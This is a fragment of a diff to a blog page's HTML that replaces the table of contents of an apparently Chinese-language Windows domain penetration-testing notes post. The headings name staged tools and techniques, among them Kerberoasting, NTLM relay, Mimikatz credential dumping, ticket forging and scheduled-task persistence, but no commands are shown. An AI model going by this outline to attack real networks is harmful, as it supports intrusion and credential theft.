               <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag"># 操作系统</a>
               <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
-              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
           </div>
 
         
@@ -362,7 +913,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-%E4%B8%8ELinux%E5%AF%B9%E7%85%A7"><span class="nav-text">常用命令 与Linux对照</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB"><span class="nav-text">SMB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#smbclient"><span class="nav-text">smbclient</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smbmap"><span class="nav-text">smbmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python3-impacket"><span class="nav-text">python3-impacket</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Impacket%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%B8%80%E8%A7%88%E8%A1%A8"><span class="nav-text">Impacket常用脚本功能一览表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GetADUsers-py"><span class="nav-text">GetADUsers.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GetUserSPNs-py"><span class="nav-text">GetUserSPNs.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%B7%A5%E5%85%B7"><span class="nav-text">横向移动工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#evil-winrm"><span class="nav-text">evil-winrm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#psexec-py"><span class="nav-text">psexec.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smbexec"><span class="nav-text">smbexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmiexec"><span class="nav-text">wmiexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#runas"><span class="nav-text">runas</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sc-exe"><span class="nav-text">sc.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#winrs-exe"><span class="nav-text">winrs.exe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gpp-decrypt"><span class="nav-text">gpp-decrypt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bloodhound"><span class="nav-text">bloodhound</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E7%AB%AF"><span class="nav-text">靶机端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%AB%AF"><span class="nav-text">攻击端</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81"><span class="nav-text">windows 安全认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-text">认证流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crackmapexec"><span class="nav-text">crackmapexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz"><span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E4%BA%94%E5%A4%A7%E6%A0%B9%E9%94%AE"><span class="nav-text">注册表的五大根键</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kerbrute-%E2%80%93%E6%89%AB%E6%8F%8F%E5%9F%9F%E4%B8%AD%E6%9C%89%E6%95%88%E7%94%A8%E6%88%B7"><span class="nav-text">kerbrute  –扫描域中有效用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#responser"><span class="nav-text">responser</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scf%E6%96%87%E4%BB%B6"><span class="nav-text">scf文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xfreerdp"><span class="nav-text">xfreerdp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="nav-text">权限维持操作：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#schtasks"><span class="nav-text">schtasks</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nishang"><span class="nav-text">nishang</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-0%EF%BC%9A%E7%9B%AE%E6%A0%87%E5%8F%91%E7%8E%B0%E4%B8%8E%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="nav-text">阶段 0：目标发现与服务识别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-text">nmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-1%EF%BC%9A%E5%8C%BF%E5%90%8D-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE"><span class="nav-text">阶段 1：匿名&#x2F;低权限信息枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#smbclient"><span class="nav-text">smbclient</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smbmap"><span class="nav-text">smbmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#enum4linux-ng-enum4linux"><span class="nav-text">enum4linux-ng &#x2F; enum4linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rpcclient"><span class="nav-text">rpcclient</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ldapsearch"><span class="nav-text">ldapsearch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetADUsers-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">GetADUsers.py（Impacket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BloodHound-SharpHound"><span class="nav-text">BloodHound + SharpHound</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-2%EF%BC%9A%E8%B4%A6%E5%8F%B7%E5%8F%91%E7%8E%B0%E4%B8%8E%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB"><span class="nav-text">阶段 2：账号发现与认证攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#kerbrute"><span class="nav-text">kerbrute</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetNPUsers-py%EF%BC%88AS-REP-Roast%EF%BC%89"><span class="nav-text">GetNPUsers.py（AS-REP Roast）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GetUserSPNs-py%EF%BC%88Kerberoast%EF%BC%89"><span class="nav-text">GetUserSPNs.py（Kerberoast）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gpp-decrypt"><span class="nav-text">gpp-decrypt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hashcat"><span class="nav-text">hashcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#john"><span class="nav-text">john</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Responder"><span class="nav-text">Responder</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SCF-%E6%96%87%E4%BB%B6%E8%AF%B1%E5%AF%BC%EF%BC%88%E6%8A%80%E5%B7%A7%EF%BC%89"><span class="nav-text">SCF 文件诱导（技巧）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ntlmrelayx-py"><span class="nav-text">ntlmrelayx.py</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-3%EF%BC%9A%E6%8B%BF%E4%BC%9A%E8%AF%9D%E4%B8%8E%E9%AA%8C%E8%AF%81%E5%8F%AF%E7%99%BB%E5%BD%95%E9%9D%A2"><span class="nav-text">阶段 3：拿会话与验证可登录面</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NetExec%EF%BC%88nxc%EF%BC%89"><span class="nav-text">NetExec（nxc）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evil-winrm"><span class="nav-text">evil-winrm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#winrs-exe"><span class="nav-text">winrs.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xfreerdp"><span class="nav-text">xfreerdp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-4%EF%BC%9A%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="nav-text">阶段 4：横向移动与远程执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">psexec.py（Impacket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smbexec-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">smbexec.py（Impacket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wmiexec-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">wmiexec.py（Impacket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#atexec-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">atexec.py（Impacket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dcomexec-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">dcomexec.py（Impacket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#runas"><span class="nav-text">runas</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sc-exe"><span class="nav-text">sc.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#schtasks"><span class="nav-text">schtasks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#chisel"><span class="nav-text">chisel</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-5%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E4%B8%8E%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="nav-text">阶段 5：本地提权与凭据提取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#winPEAS%EF%BC%88PEASS-ng%EF%BC%89"><span class="nav-text">winPEAS（PEASS-ng）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Potato-%E7%B3%BB%E5%88%97%EF%BC%88BadPotato-SweetPotato%EF%BC%89"><span class="nav-text">Potato 系列（BadPotato &#x2F; SweetPotato）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mimikatz"><span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#secretsdump-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">secretsdump.py（Impacket）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-6%EF%BC%9A%E5%9F%9F%E6%8F%90%E6%9D%83%E3%80%81%E7%A5%A8%E6%8D%AE%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">阶段 6：域提权、票据与持久化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#certipy"><span class="nav-text">certipy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rubeus"><span class="nav-text">Rubeus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ticketer-py%EF%BC%88Impacket%EF%BC%89"><span class="nav-text">ticketer.py（Impacket）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5-7%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%BE%85%E5%8A%A9%E6%A1%86%E6%9E%B6"><span class="nav-text">阶段 7：后渗透基础命令与辅助框架</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81-Windows-%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4%EF%BC%88%E6%8B%BF%E5%88%B0-shell-%E5%90%8E%EF%BC%89"><span class="nav-text">常见 Windows 内置命令（拿到 shell 后）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nishang%EF%BC%88PowerShell-%E6%A1%86%E6%9E%B6%EF%BC%89"><span class="nav-text">Nishang（PowerShell 框架）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impacket-%E5%B7%A5%E5%85%B7%E5%8C%85%E5%85%B6%E4%BB%96%E8%84%9A%E6%9C%AC%E8%AF%B4%E6%98%8E"><span class="nav-text">Impacket 工具包其他脚本说明</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
